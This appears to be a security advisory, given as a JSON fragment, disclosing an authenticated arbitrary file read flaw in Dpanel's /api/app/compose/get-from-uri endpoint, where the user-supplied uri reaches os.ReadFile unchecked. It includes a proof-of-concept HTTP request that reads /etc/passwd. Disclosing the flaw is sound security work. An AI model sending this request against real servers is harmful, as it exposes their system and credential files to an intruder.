  "summary": "Dpanel has an arbitrary file read vulnerability",
  "details": "### Summary\nDpanel has an arbitrary file read vulnerability in the /api/app/compose/get-from-uri interface.Logged in to Dpanel ,this interface can be used to read arbitrary files.\n\n### Details\nWhen a user logs into the administrative backend, this interface can read any files on the host/sever (given the necessary permissions), which may lead to system information leakage. The vulnerability lies in the GetFromUri function within the app/application/http/controller/compose.go file. The uri parameter submitted by the user in JSON format can be directly read and returned by os.ReadFile without proper security handling.\n![image-20250702004157585](https://github.com/user-attachments/assets/1f0e683b-bf0b-49e6-8d68-833fcf3f214d)\n![image-20250702004223184](https://github.com/user-attachments/assets/b5e89e02-f572-4edf-aaa8-566dea090d3f)\n\n### PoC\n```text\nPOST /api/app/compose/get-from-uri HTTP/1.1\nHost: x.x.x.x\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nAuthorization: Bearer eyJ......lWg==\nConnection: close\nContent-Type: application/json\nContent-Length: 21\n\n{\"uri\":\"/etc/passwd\"}\n```\n\n### Impact\nThis vulnerability could lead to the leakage of sensitive server file information.
